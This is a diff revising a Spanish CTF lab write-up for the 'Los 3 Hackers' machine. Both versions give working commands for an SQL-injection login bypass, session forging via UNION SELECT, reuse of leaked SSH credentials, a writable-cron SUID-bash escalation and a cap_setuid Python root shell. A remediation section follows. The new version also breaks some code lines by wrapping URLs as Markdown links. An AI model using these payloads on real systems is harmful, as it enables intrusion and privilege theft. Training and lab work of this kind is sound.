@@ -1,10 +1,14 @@
-# 🎯 Los 3 Hackers — Writeup (172.17.0.3)
+<div align="center">
+  <h1>🎯 Writeup: Los 3 Hackers</h1>
+  <p>
+    <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux" alt="OS">
+    <img src="https://img.shields.io/badge/Dificultad-Fácil_Media-brightgreen?style=for-the-badge" alt="Difficulty">
+    <img src="https://img.shields.io/badge/IP-172.17.0.3-red?style=for-the-badge&logo=ip" alt="IP">
+  </p>
+</div>
 
-> **Máquina:** Los 3 Hackers · **IP:** `172.17.0.3` · **Dificultad:** Fácil–Media
-> **SO:** Linux (contenedor Ubuntu) · **Servicios:** SSH (22) y HTTP/Gunicorn (80)
-> **Flags:** 4 (panel web, redhacker, bluehacker, blackhacker, root)
-
-> ⚠️ **Aviso:** este writeup es para laboratorios propios o entornos con autorización explícita. No lo uses contra sistemas sin permiso.
+> [!WARNING]
+> **Aviso legal:** Este writeup documenta técnicas de explotación ofensiva para entornos de laboratorio y proyectos con autorización explícita. No utilices estas tácticas contra sistemas de terceros sin consentimiento formal.
 
 ---
 
@@ -12,100 +16,81 @@
 
 1. [Resumen de la cadena de ataque](#-resumen-de-la-cadena-de-ataque)
 2. [Requisitos](#-requisitos)
-3. [Fase 1 — Reconocimiento](#-fase-1--reconocimiento)
-4. [Fase 2 — Enumeración web](#-fase-2--enumeración-web)
-5. [Fase 3 — SQL Injection: bypass del login](#-fase-3--sql-injection-bypass-del-login)
-6. [Fase 4 — UNION SELECT: forjar la sesión](#-fase-4--union-select-forjar-la-sesión)
-7. [Fase 5 — /wow.zip: credenciales SSH](#-fase-5--wowzip-credenciales-ssh)
-8. [Fase 6 — RCE por SSH como redhacker](#-fase-6--rce-por-ssh-como-redhacker)
-9. [Fase 7 — Post-explotación y escalada a root](#-fase-7--post-explotación-y-escalada-a-root)
-10. [Fase 8 — Limpieza](#-fase-8--limpieza)
+3. [Fase 1: Reconocimiento](#-fase-1-reconocimiento)
+4. [Fase 2: Enumeración web](#-fase-2-enumeración-web)
+5. [Fase 3: SQL Injection (Bypass del login)](#-fase-3-sql-injection-bypass-del-login)
+6. [Fase 4: UNION SELECT (Forjar la sesión)](#-fase-4-union-select-forjar-la-sesión)
+7. [Fase 5: Extracción de credenciales SSH](#-fase-5-extracción-de-credenciales-ssh)
+8. [Fase 6: RCE por SSH como redhacker](#-fase-6-rce-por-ssh-como-redhacker)
+9. [Fase 7: Post-explotación y escalada a root](#-fase-7-post-explotación-y-escalada-a-root)
+10. [Fase 8: Limpieza y persistencia](#-fase-8-limpieza)
 11. [Flags](#-flags)
 12. [Vulnerabilidades y remediación](#-vulnerabilidades-y-remediación)
-13. [Anexo: troubleshooting](#-anexo-troubleshooting)
+13. [Troubleshooting](#-troubleshooting)
 
 ---
 
 ## 🧭 Resumen de la cadena de ataque
 
-```text
-Reconocimiento (22/80)
-        │
-        ▼
-SQLi en /login  ──►  bypass de autenticación (admin'--)
-        │
-        ▼
-Dashboard: flag {SQLi_bypass_r4t3_l1m1t_pwn3d}
-        │
-        ▼
-/wow.zip ──► permission.txt ──► redhacker:h4ck1NNN62026!!
-        │
-        ▼
-SSH redhacker ──► RCE (uid=1000)
-        │
-        ▼
-Portal interno 127.0.0.1:5000 ──► bluehacker:xKpIEAE3fkp--
-        │
-        ▼
-/opt/maintenance/m.sh (escribible por bluehacker) + cron como blackhacker
-        │
-        ▼
-Bash SUID ──► blackhacker (uid=1002)
-        │
-        ▼
-/usr/local/bin/syscheck con cap_setuid=ep ──► root (uid=0)
-        │
-        ▼
-/root/root.txt
+```mermaid
+graph TD;
+    A[Reconocimiento 22/80] --> B[SQLi en /login];
+    B --> C[Bypass Autenticación: admin'--];
+    C --> D[Dashboard Flag];
+    C --> E[Descarga de /wow.zip];
+    E --> F[Backup: permission.txt];
+    F --> G[SSH redhacker];
+    G --> H[Portal Interno 127.0.0.1:5000];
+    H --> I[Pivoteo: bluehacker];
+    I --> J[Cron m.sh escribible];
+    J --> K[Bash SUID];
+    K --> L[Privesc: blackhacker];
+    L --> M[Binary syscheck con cap_setuid];
+    M --> N((Root Shell));
 ```
 
 ---
 
 ## 🧰 Requisitos
 
-- Linux (Kali/Parrot/Ubuntu) o WSL.
-- Herramientas: `nmap`, `curl`, `unzip`, `ssh`, `sshpass`, `feroxbuster`/`gobuster`.
-- Opcional: `whatweb`, `ffuf`, `nikto`, `flask-unsign`.
+- **SO Recomendado:** Kali Linux, Parrot OS, Ubuntu o WSL.
+- **Herramientas:** `nmap`, `curl`, `unzip`, `ssh`, `sshpass`, `feroxbuster` / `gobuster`.
+- **Opcionales:** `whatweb`, `ffuf`, `nikto`, `flask-unsign`.
 
-Instalación rápida en Debian/Ubuntu/Kali:
+> [!TIP]
+> **Instalación rápida de dependencias en Debian/Ubuntu/Kali:**
+> ```bash
+> sudo apt update && sudo apt install -y nmap curl unzip openssh-client sshpass feroxbuster whatweb
+> ```
 
-```bash
-sudo apt update
-sudo apt install -y nmap curl unzip openssh-client sshpass feroxbuster whatweb
-```
-
-Crear un directorio de trabajo:
+### Configuración del entorno de trabajo
 
 ```bash
 mkdir -p ~/labs/los3hackers/{scans,loot}
 cd ~/labs/los3hackers
-export TARGET=172.17.0.3
+export TARGET="172.17.0.3"
 ```
 
-> 💡 Si la máquina corre en Docker y no sabes la IP:
+> [!NOTE]
+> Si la máquina se está ejecutando localmente en Docker y no conoces la IP, puedes extraerla con:
 > ```bash
-> docker ps
 > docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' los3hackers_container
 > ```
 
 ---
 
-## 🔎 Fase 1 — Reconocimiento
+## 🔎 Fase 1: Reconocimiento
 
 ### 1.1 Comprobar conectividad
-
 ```bash
 ping -c 2 $TARGET
 ```
 
 ### 1.2 Escaneo completo de puertos TCP
-
 ```bash
 nmap -p- -T4 --min-rate 2000 -oN scans/allports.txt $TARGET
 ```
-
-Salida esperada:
-
+**Salida esperada:**
 ```text
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -113,144 +98,84 @@ PORT   STATE SERVICE
 ```
 
 ### 1.3 Detección de versiones y scripts básicos
-
 ```bash
 nmap -p22,80 -sV -sC -oN scans/services.txt $TARGET
 ```
-
-Salida relevante:
-
+**Salida relevante:**
 ```text
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
 80/tcp open  http    Gunicorn
 |_http-title: Los 3 Hackers – Ayuda al Red Hacker
 ```
 
-### 1.4 Identificar la tecnología web
-
+### 1.4 Identificación tecnológica
 ```bash
 whatweb -a 3 http://$TARGET/
 curl -sI http://$TARGET/
 ```
-
-Cabecera clave:
-
-```text
-Server: gunicorn
-```
-
-`Gunicorn` + títulos en español nos indican una aplicación **Python (Flask/Django)**. Más adelante confirmaremos Flask.
+La cabecera `Server: gunicorn` en combinación con la estructura indica un backend desarrollado en **Python (Flask/Django)**.
 
 ---
 
-## 🌐 Fase 2 — Enumeración web
+## 🌐 Fase 2: Enumeración web
 
-### 2.1 Ver la página principal
-
+### 2.1 Análisis de la página principal
 ```bash
 curl -s http://$TARGET/ -o loot/index.html
 ```
-
-En el HTML aparecen enlaces a `/login` y a una imagen estática:
-
+En el código fuente se identifican referencias clave:
 ```html
 <a class="btn-help" href="/login">Ayudar al Red Hacker</a>
 <img src="/static/los3hackers.png">
 ```
 
-### 2.2 Enumerar directorios y archivos
-
-Con **feroxbuster**:
-
+### 2.2 Fuzzing de directorios
+Utilizando **feroxbuster**:
 ```bash
 feroxbuster -u http://$TARGET/ \
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
   -t 40 -d 2 -q --no-state -o scans/ferox.txt
 ```
 
-O con **gobuster**:
+| Ruta | Código HTTP | Observación |
+|------|-------------|-------------|
+| `/` | `200 OK` | Landing page |
+| `/login` | `200 OK` | Formulario de autenticación |
+| `/logout` | `302 Found` | Destrucción de sesión |
+| `/dashboard` | `302 Found` | Requiere autenticación |
+| `/dashboard/backups` | `403 Forbidden` | Directorio restringido (Señuelo) |
+| `/wow.zip` | `200/403` | Backup (Requiere sesión activa) |
+| `/static/<path>` | `200 OK` | Assets estáticos |
 
-```bash
-gobuster dir -u http://$TARGET/ \
-  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-  -t 40 -o scans/gobuster.txt
-```
-
-Rutas encontradas:
-
-| Ruta | Código | Nota |
-|------|--------|------|
-| `/` | 200 | Página de la historia |
-| `/login` | 200 | Formulario de acceso |
-| `/logout` | 302 | Cierra sesión |
-| `/dashboard` | 302 | Redirige si no hay sesión |
-| `/dashboard/backups` | 403 | Módulo restringido (señuelo) |
-| `/wow.zip` | 403/200 | Backup (requiere sesión) |
-| `/static/<path>` | 200 | Archivos estáticos |
-
-### 2.3 Inspeccionar el formulario de login
-
+### 2.3 Inspección del formulario de Login
 ```bash
 curl -s http://$TARGET/login -o loot/login.html
 grep -oiE '<form[^>]*>|<input[^>]*>' loot/login.html
 ```
+El formulario envía las credenciales mediante método **POST** usando los parámetros `username` y `password`.
 
-Salida:
-
-```html
-<form method="POST" action="/login">
-<input type="text" id="username" name="username" ...>
-<input type="password" id="password" name="password" ...>
-```
-
-El login envía `username` y `password` por **POST** a `/login`.
-
-### 2.4 Comportamiento del rate limit
-
-Haz varios intentos fallidos seguidos:
-
+### 2.4 Análisis del Rate Limit
 ```bash
-for i in 1 2 3 4; do
-  curl -s -d "username=test&password=test" http://$TARGET/login \
-    | grep -oiE 'Usuario o contraseña incorrectos|Demasiados intentos[^<]*'
+for i in {1..4}; do
+  curl -s -d "username=test&password=test" http://$TARGET/login | grep -oiE 'Usuario o contraseña incorrectos|Demasiados intentos[^<]*'
 done
 ```
-
-Verás que tras **3 fallos** la IP queda bloqueada **30 segundos**:
-
-```text
-Usuario o contraseña incorrectos
-Usuario o contraseña incorrectos
-Usuario o contraseña incorrectos
-Demasiados intentos fallidos. Intenta de nuevo en 30 segundos.
-```
-
-> ⏳ Si te bloqueas, espera 30 s o reinicia el contenedor. Un login exitoso limpia el contador.
+**Comportamiento detectado:** Tras 3 intentos fallidos, el sistema bloquea la IP durante 30 segundos. Un login exitoso restablece el contador.
 
 ---
 
-## 💉 Fase 3 — SQL Injection: bypass del login
+## 💉 Fase 3: SQL Injection (Bypass del login)
 
-### 3.1 ¿Por qué es vulnerable?
-
-El backend construye la consulta concatenando strings (patrón inseguro):
-
+### 3.1 Análisis de la vulnerabilidad
+El backend de Flask construye la consulta concatenando cadenas en lugar de utilizar consultas parametrizadas:
 ```sql
-SELECT username, role FROM users
-WHERE username = '<username>' AND password = '<password>';
+-- Código inseguro en el backend:
+SELECT username, role FROM users WHERE username = '<username>' AND password = '<password>';
 ```
+El filtro de seguridad implementado únicamente bloquea el operador lógico `OR`, pero **no sanitiza** los comentarios SQL (`--`, `#`) ni las declaraciones `UNION`.
 
-Además, el filtro de seguridad **solo bloquea la palabra `OR`** y **no** bloquea comentarios SQL (`--`, `#`) ni `UNION`.
-
-### 3.2 Probar el bypass
-
-Envía como usuario:
-
-```text
-admin'--
-```
-
-Con contraseña cualquiera:
+### 3.2 Ejecución del bypass
+Inyectamos el payload `admin'--` en el parámetro `username`:
 
 ```bash
 curl -i -c loot/cookies.txt \
@@ -258,270 +183,129 @@ curl -i -c loot/cookies.txt \
   --data-urlencode "password=x" \
   http://$TARGET/login
 ```
-
-La consulta resultante es:
-
+La consulta interpretada por el motor de base de datos se transforma en:
 ```sql
-SELECT username, role FROM users
-WHERE username = 'admin'--' AND password = 'x';
+SELECT username, role FROM users WHERE username = 'admin'--' AND password = 'x';
 ```
+El comentario `--` anula la validación de la contraseña, autenticando al usuario `admin`.
 
-`--` comenta el resto, así que la condición de contraseña **desaparece** y se devuelve el usuario `admin`.
-
-### 3.3 Resultado esperado
-
+### 3.3 Extracción de la cookie de sesión
+Respuesta del servidor:
 ```http
 HTTP/1.1 302 FOUND
-Location: http://172.17.0.3/dashboard
+Location: [http://172.17.0.3/dashboard](http://172.17.0.3/dashboard)
 Set-Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0...
 ```
+El payload JWT decodificado revela: `{"role": "admin", "username": "admin"}`.
 
-La cookie de sesión es una cookie **Flask firmada**. Su parte decodificable es:
-
-```json
-{"role": "admin", "username": "admin"}
-```
-
-### 3.4 Acceder al dashboard
-
+### 3.4 Captura de la flag del Dashboard
 ```bash
 curl -s -b loot/cookies.txt http://$TARGET/dashboard -o loot/dashboard.html
 grep -oE '\{[^}]*\}' loot/dashboard.html
 ```
-
-**Flag del panel:**
-
-```text
-{SQLi_bypass_r4t3_l1m1t_pwn3d}
-```
-
-> 🧠 **Truco:** si quieres ver la cookie legible:
-> ```bash
-> python3 - <<'PY'
-> import base64
-> cookie = "eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.au34Rw.OJb_..."
-> print(base64.urlsafe_b64decode(cookie.split('.')[0] + '=='))
-> PY
-> ```
+🚩 **Flag capturada:** `{SQLi_bypass_r4t3_l1m1t_pwn3d}`
 
 ---
 
-## 🧩 Fase 4 — UNION SELECT: forjar la sesión
+## 🧩 Fase 4: UNION SELECT (Forjar la sesión)
 
-Esta fase **no es imprescindible** para el RCE, pero demuestra que la inyección permite controlar `username` y `role`.
+> [!NOTE]
+> Esta fase demuestra el impacto total de la inyección SQL, permitiendo manipulación arbitraria de roles. No es estrictamente necesaria para alcanzar RCE.
 
-### 4.1 Averiguar el número de columnas
-
-La consulta devuelve **2 columnas** (`username`, `role`). Un `UNION` con 2 columnas funciona:
-
-```bash
-curl -i -c loot/union.txt \
-  --data-urlencode "username=zzz' union select 1,2--" \
-  --data-urlencode "password=x" \
-  http://$TARGET/login
-```
-
-Resultado: `302` y cookie:
-
-```json
-{"role": 2, "username": 1}
-```
-
-Un `UNION` con 3 columnas falla (la consulta original solo tiene 2).
-
-### 4.2 Forzar rol `superadmin`
-
+Al determinar que la consulta original retorna **2 columnas**, podemos forjar sesiones:
 ```bash
 curl -i -c loot/union_admin.txt \
   --data-urlencode "username=zzz' union select 'admin','superadmin'--" \
   --data-urlencode "password=x" \
   http://$TARGET/login
 ```
-
-Cookie:
-
-```json
-{"role": "superadmin", "username": "admin"}
-```
-
-> ⚠️ `/dashboard/backups` **siempre devuelve 403**, incluso con `role=superadmin`. Es un **señuelo**. La ruta útil es `/wow.zip`.
+Esto nos asigna el rol de `superadmin` directamente en la cookie de sesión firmada por Flask. *(Nota: La ruta `/dashboard/backups` seguirá arrojando 403, sirviendo como rabbit hole).*
 
 ---
 
-## 📦 Fase 5 — /wow.zip: credenciales SSH
+## 📦 Fase 5: Extracción de credenciales SSH
 
-### 5.1 Descargar el backup
-
-`/wow.zip` solo exige tener una sesión válida (cualquier usuario, incluso `staff`):
+Con nuestra sesión válida, procedemos a descargar el archivo de backup identificado durante el fuzzing:
 
 ```bash
-curl -s -b loot/cookies.txt \
-  http://$TARGET/wow.zip -o loot/wow.zip
-
+curl -s -b loot/cookies.txt http://$TARGET/wow.zip -o loot/wow.zip
 file loot/wow.zip
 unzip -o loot/wow.zip -d loot/wow/
 cat loot/wow/permission.txt
 ```
-
-Salida:
-
+**Contenido extraído:**
 ```text
 redhacker:h4ck1NNN62026!!
 ```
-
-> 🔍 **Hallazgo:** las credenciales SSH están en texto plano dentro de un backup descargable por cualquier usuario autenticado.
+> [!IMPORTANT]
+> **Hallazgo Crítico:** Credenciales de acceso SSH almacenadas en texto plano dentro de un directorio accesible para cualquier usuario autenticado en la web.
 
 ---
 
-## 🖥️ Fase 6 — RCE por SSH como redhacker
+## 🖥️ Fase 6: RCE por SSH como redhacker
 
-### 6.1 Conectarse
-
-Con `sshpass`:
-
+### 6.1 Conexión interactiva
 ```bash
-sshpass -p 'h4ck1NNN62026!!' ssh \
-  -o StrictHostKeyChecking=no \
-  -o UserKnownHostsFile=/dev/null \
-  redhacker@$TARGET
+sshpass -p 'h4ck1NNN62026!!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null redhacker@$TARGET
 ```
 
-O interactivo (te pedirá la contraseña):
-
+### 6.2 Verificación de acceso
 ```bash
-ssh redhacker@$TARGET
-```
-
-### 6.2 Verificar la ejecución remota de comandos
-
-```bash
-id
-hostname
-uname -a
-```
-
-Salida:
-
-```text
+redhacker@4dd061c4e632:~$ id
 uid=1000(redhacker) gid=1000(redhacker) groups=1000(redhacker)
-4dd061c4e632
+redhacker@4dd061c4e632:~$ uname -a
 Linux 4dd061c4e632 ... x86_64 GNU/Linux
 ```
-
-✅ **RCE confirmado.**
-
-### 6.3 Ejecutar comandos sin shell interactiva
-
-```bash
-sshpass -p 'h4ck1NNN62026!!' ssh \
-  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
-  redhacker@$TARGET 'id; cat ~/user.txt'
-```
+✅ **RCE Confirmado.**
 
 ---
 
-## 🚀 Fase 7 — Post-explotación y escalada a root
+## 🚀 Fase 7: Post-explotación y escalada a root
 
-### 7.1 redhacker: leer la pista
-
+### 7.1 Pista inicial de redhacker
 ```bash
 cat /home/redhacker/user.txt
 ```
+> *"La próxima vez revisa el portal interno que tenemos, al menos yo lo ocupo para guardar la mia. - Blue"*
 
-Contenido:
-
-```text
-Red...
-
-Ya es la tercera vez que olvidas la contraseña.
-...
-La próxima vez revisa el portal interno que tenemos,
-al menos yo lo ocupo para guardar la mia.
-
-- Blue
-```
-
-La pista indica un **portal interno**.
-
-### 7.2 Descubrir el portal interno
-
-Como `redhacker`, lista puertos en escucha:
-
+### 7.2 Descubrimiento del portal interno
+Listamos los puertos locales en escucha:
 ```bash
 ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
 ```
-
-Verás algo como:
-
-```text
-LISTEN 127.0.0.1:5000
-```
-
-Está **solo en localhost**. Descárgalo con Python (en la máquina víctima no hay `curl`):
-
+Se identifica un servicio en `127.0.0.1:5000`. Al no contar con `curl`, utilizamos Python para realizar la petición local:
 ```bash
-python3 -c "import urllib.request; print(urllib.request.urlopen('http://127.0.0.1:5000/', timeout=5).read().decode())"
+python3 -c "import urllib.request; print(urllib.request.urlopen('[http://127.0.0.1:5000/](http://127.0.0.1:5000/)', timeout=5).read().decode())"
 ```
-
-El portal muestra credenciales temporales:
-
+**Respuesta:**
 ```text
-User     › bluehacker
+User  › bluehacker
 Password › xKpIEAE3fkp--
 ```
 
-### 7.3 Lateral: redhacker → bluehacker
-
+### 7.3 Movimiento lateral a bluehacker
 ```bash
-sshpass -p 'xKpIEAE3fkp--' ssh \
-  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
-  bluehacker@$TARGET
+sshpass -p 'xKpIEAE3fkp--' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bluehacker@$TARGET
 ```
-
-Verifica y lee la flag:
-
+Leemos la flag/pista:
 ```bash
-id
 cat ~/user.txt
 ```
+> *"Black siempre ha sido desconfiado. Dice que las tareas importantes deben ejecutarse solas. Cada minuto comprueba que todo siga exactamente como él lo dejó."*
 
-Contenido:
-
-```text
-Black siempre ha sido desconfiado.
-
-Dice que las tareas importantes
-deben ejecutarse solas.
-
-Cada minuto comprueba que todo
-siga exactamente como él lo dejó.
-```
-
-La pista habla de **tareas que se ejecutan solas cada minuto** → un **cron job**.
-
-### 7.4 Enumerar el cron y el script de mantenimiento
-
+### 7.4 Abuso del Cron Job (Escalada a blackhacker)
+Revisamos las tareas programadas:
 ```bash
-ls -la /etc/cron.d/
 cat /etc/cron.d/maintenance
-ls -la /opt/maintenance/
+# Salida: * * * * * blackhacker /opt/maintenance/m.sh
+
+ls -la /opt/maintenance/m.sh
+# Salida: -rwxrwxr-x 1 blackhacker bluehacker 124 ... /opt/maintenance/m.sh
 ```
+El script `m.sh` es ejecutado cada minuto por `blackhacker` y nuestro usuario `bluehacker` tiene permisos de escritura (775).
 
-Salida:
-
-```text
-* * * * * blackhacker /opt/maintenance/m.sh
-
--rwxrwxr-x 1 blackhacker bluehacker 124 ... /opt/maintenance/m.sh
-```
-
-- El cron ejecuta `m.sh` **cada minuto como `blackhacker`**.
-- El script es del grupo `bluehacker` y tiene permisos **775** → **bluehacker puede escribirlo**.
-
-### 7.5 Escalar bluehacker → blackhacker
-
-Sobrescribe `m.sh` con un payload que cree un **bash SUID** propiedad de `blackhacker`:
-
+**Inyección del Payload:**
+Sobrescribimos el script para que genere una bash SUID al ejecutarse:
 ```bash
 printf '%s\n' \
   '#!/bin/bash' \
@@ -529,89 +313,42 @@ printf '%s\n' \
   'chown blackhacker:blackhacker /var/tmp/.bh' \
   'chmod 4755 /var/tmp/.bh' \
   > /opt/maintenance/m.sh
-
-cat /opt/maintenance/m.sh
 ```
-
-Espera **hasta 60 segundos** (el cron corre cada minuto) y comprueba:
-
+Esperamos un máximo de 60 segundos y ejecutamos la bash SUID:
 ```bash
-ls -la /var/tmp/.bh
+/var/tmp/.bh -p
+blackhacker-bash$ id
+uid=1001(bluehacker) gid=1001(bluehacker) euid=1002(blackhacker)
 ```
+Leemos la flag de blackhacker en `/home/blackhacker/user.txt`, la cual nos sugiere revisar los "privilegios".
 
-Cuando aparezca con `-rwsr-xr-x` y propietario `blackhacker`, ejecútalo:
-
+### 7.5 Escalada final a Root vía Capabilities
+Buscamos binarios con capabilities asignadas:
 ```bash
-/var/tmp/.bh -p -c 'id; cat /home/blackhacker/user.txt'
+getcap -r / 2>/dev/null
+# Salida: /usr/local/bin/syscheck cap_setuid=ep
 ```
+El binario `/usr/local/bin/syscheck` es un intérprete de Python renombrado con la capability `cap_setuid` habilitada. 
 
-Salida:
-
-```text
-uid=1001(bluehacker) gid=1001(bluehacker) euid=1002(blackhacker) ...
-```
-
-Flag/pista de blackhacker:
-
-```text
-No confío en contraseñas.
-...
-Los privilegios...
-
-Esos sí permanecen.
-```
-
-La pista apunta a **privilegios** → busca **capabilities** o SUID.
-
-### 7.6 Escalar blackhacker → root
-
-Como blackhacker (usando el bash SUID), enumera capabilities:
-
+Abusamos del intérprete para forzar el UID a 0 (root) y spawnear una shell:
 ```bash
-/var/tmp/.bh -p -c 'getcap -r / 2>/dev/null'
-```
-
-Salida clave:
-
-```text
-/usr/local/bin/syscheck cap_setuid=ep
-```
-
-`syscheck` es un binario **world-executable** con la capability `cap_setuid`. Al ejecutarlo, `--help` revela que es un **intérprete de Python**:
-
-```bash
-/var/tmp/.bh -p -c '/usr/local/bin/syscheck --help'
-```
-
-Eso permite llamar a `os.setuid(0)` desde Python y convertirnos en **root**:
-
-```bash
-/usr/local/bin/syscheck -c 'import os; os.setuid(0); os.system("id; cat /root/root.txt")'
-```
-
-Salida:
-
-```text
+/usr/local/bin/syscheck -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root-bash# id
 uid=0(root) gid=1001(bluehacker) groups=1001(bluehacker)
-...contenido de /root/root.txt...
 ```
-
-✅ **Root conseguido.**
-
-> 🧠 Alternativa: si el binario no aceptara `-c`, podrías ejecutar un script:
-> ```bash
-> echo 'import os; os.setuid(0); os.system("/bin/bash")' > /tmp/x.py
-> /usr/local/bin/syscheck /tmp/x.py
-> ```
+🚩 **Leemos la flag final:**
+```bash
+cat /root/root.txt
+```
 
 ---
 
-## 🧹 Fase 8 — Limpieza
+## 🧹 Fase 8: Limpieza
 
-Restaura el script de mantenimiento original y elimina el bash SUID:
+Como buena práctica de Red Team, eliminamos rastros y restauramos la configuración:
 
 ```bash
-# Como bluehacker: restaurar m.sh
+# Restaurar m.sh (como bluehacker)
 printf '%s\n' \
   '#!/bin/bash' \
   '# Script de mantenimiento - limpia archivos temporales' \
@@ -619,123 +356,86 @@ printf '%s\n' \
   'find /tmp -type f -mtime +1 -delete 2>/dev/null' \
   > /opt/maintenance/m.sh
 
-# Como root: borrar el SUID
+# Eliminar binario SUID (como root)
 rm -f /var/tmp/.bh
-```
-
-Comprueba:
-
-```bash
-ls -la /opt/maintenance/m.sh
-ls -la /var/tmp/.bh 2>&1
 ```
 
 ---
 
 ## 🏁 Flags
 
-| Ubicación | Flag / contenido |
-|-----------|------------------|
-| Dashboard web | `{SQLi_bypass_r4t3_l1m1t_pwn3d}` |
-| `/home/redhacker/user.txt` | Pista → portal interno |
-| `/home/bluehacker/user.txt` | Pista → cron de Black |
-| `/home/blackhacker/user.txt` | Pista → capabilities |
-| `/root/root.txt` | Mensaje final de IHATEFW |
+| Archivo / Ubicación | Contenido / Contexto |
+|---------------------|----------------------|
+| **Dashboard web** | `{SQLi_bypass_r4t3_l1m1t_pwn3d}` |
+| `/home/redhacker/user.txt` | Pista hacia el portal interno de credenciales |
+| `/home/bluehacker/user.txt` | Pista sobre la tarea automatizada de Black |
+| `/home/blackhacker/user.txt` | Pista relacionada con escalamiento por Capabilities |
+| `/root/root.txt` | Mensaje de finalización y victoria (IHATEFW) |
 
 ---
 
 ## 🛡️ Vulnerabilidades y remediación
 
-| # | Severidad | Vulnerabilidad | Remediación |
-|---|-----------|----------------|-------------|
-| 1 | Crítica | SQL Injection en `/login` | Consultas parametrizadas (`?`) |
-| 2 | Crítica | Credenciales SSH en `/wow.zip` | No incluir secretos en backups; cifrar y restringir |
-| 3 | Crítica | Acceso remoto con credenciales filtradas | Rotar credenciales; usar claves SSH + MFA |
-| 4 | Alta | Portal interno con credenciales en claro | Gestor de secretos; no texto plano |
-| 5 | Alta | Cron con script escribible por grupo | `root:root 755`, monitorizar integridad |
-| 6 | Crítica | Python con `cap_setuid=ep` | Quitar la capability; auditar `getcap -r /` |
-| 7 | Media | Rate limit débil (3/30 s) | Backoff progresivo, CAPTCHA, por cuenta + IP |
-| 8 | Media | Blacklist que solo bloquea `OR` | Validación de entrada + WAF real |
-| 9 | Media | `SECRET_KEY` hardcodeada | Variables de entorno / gestor de secretos |
-| 10 | Baja | Sesión manipulable vía `UNION` | No confiar en datos de sesión sin validar rol en servidor |
+| # | Severidad | Vulnerabilidad | Remediación recomendada |
+|---|:---:|----------------|-------------------------|
+| 1 | **Crítica** | SQL Injection (Bypass Autenticación) | Utilizar consultas parametrizadas (Prepared Statements) o un ORM confiable (ej. SQLAlchemy). |
+| 2 | **Crítica** | Almacenamiento Inseguro de Credenciales | No incluir secretos en archivos de backup web. Implementar bóvedas de contraseñas. |
+| 3 | **Alta** | Permisos Inseguros en Cron Jobs | Asignar la propiedad del script a `root:root` con permisos `755` y monitorizar la integridad (FIM). |
+| 4 | **Alta** | Capabilities excesivas (`cap_setuid`) | Eliminar la capability del binario intérprete mediante `setcap -r /usr/local/bin/syscheck`. |
+| 5 | **Media** | Rate Limiting Débil (3 / 30s) | Implementar bloqueo progresivo exponencial, CAPTCHA tras reintentos o bloqueos estrictos por IP/Cuenta. |
 
-### Ejemplo de login seguro (Flask + SQLite)
-
+### 🔒 Implementación Segura (Backend Python/Flask)
 ```python
-# ❌ VULNERABLE
-query = "SELECT username, role FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+# ❌ PATRÓN VULNERABLE
+query = f"SELECT username, role FROM users WHERE username = '{username}' AND password = '{password}'"
 
-# ✅ SEGURO
+# ✅ PATRÓN SEGURO (Consultas parametrizadas)
 cur.execute(
     "SELECT username, role FROM users WHERE username = ? AND password = ?",
-    (username, password),
+    (username, password)
 )
 ```
-
-> En producción, además, las contraseñas deben almacenarse con **hash** (bcrypt/argon2), nunca en texto plano.
+> [!IMPORTANT]
+> Adicionalmente, las contraseñas en bases de datos productivas deben estar **siempre cifradas mediante algoritmos de hashing robustos** con salt (ej. Argon2id, bcrypt), previniendo su compromiso total en caso de inyección.
 
 ---
 
-## 🧰 Anexo: troubleshooting
+## 🧰 Troubleshooting
 
-### Error `REMOTE HOST IDENTIFICATION HAS CHANGED`
+<details>
+<summary><strong>Falla SSH: <code>REMOTE HOST IDENTIFICATION HAS CHANGED</code></strong></summary>
 
-Usa un `known_hosts` limpio:
-
+Borra la firma almacenada o usa una conexión limpia:
 ```bash
 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null redhacker@$TARGET
 ```
+</details>
 
-### `sshpass: command not found`
+<details>
+<summary><strong>No encuentro el binario <code>curl</code> en la máquina víctima</strong></summary>
 
+Los contenedores y sistemas endurecidos pueden carecer de binarios estándar. Utiliza módulos nativos de Python o Perl en su lugar:
 ```bash
-sudo apt install -y sshpass
+python3 -c "import urllib.request; print(urllib.request.urlopen('[http://127.0.0.1:5000/').read().decode](http://127.0.0.1:5000/').read().decode)())"
 ```
+</details>
 
-O conecta manualmente:
+<details>
+<summary><strong>El Cron Job no me genera la Bash SUID (<code>/var/tmp/.bh</code>)</strong></summary>
 
-```bash
-ssh redhacker@$TARGET
-# contraseña: h4ck1NNN62026!!
-```
-
-### `curl: command not found` dentro de la víctima
-
-Usa Python:
-
-```bash
-python3 -c "import urllib.request; print(urllib.request.urlopen('http://127.0.0.1:5000/').read().decode())"
-```
-
-### El cron no crea `/var/tmp/.bh`
-
-- Espera hasta 60 s (corre al inicio de cada minuto).
-- Verifica que `m.sh` tenga el shebang y permisos correctos.
-- Comprueba el servicio cron: `service cron status`.
-
-### Me quedé bloqueado en el login
-
-- Espera **30 segundos**.
-- O haz un login exitoso con `admin'--` para limpiar el contador.
-
-### La IP cambió al reiniciar el contenedor
-
-```bash
-docker ps
-docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' los3hackers_container
-```
+- Ten en cuenta que la tarea se ejecuta al inicio de cada minuto (puedes tardar hasta 60s en ver el resultado).
+- Verifica que escribiste correctamente la sintaxis de bash en `m.sh` utilizando rutas absolutas (`/bin/bash`).
+</details>
 
 ---
 
-## 📚 Referencias
+<div align="center">
+  <p><strong>📖 Referencias Metodológicas</strong></p>
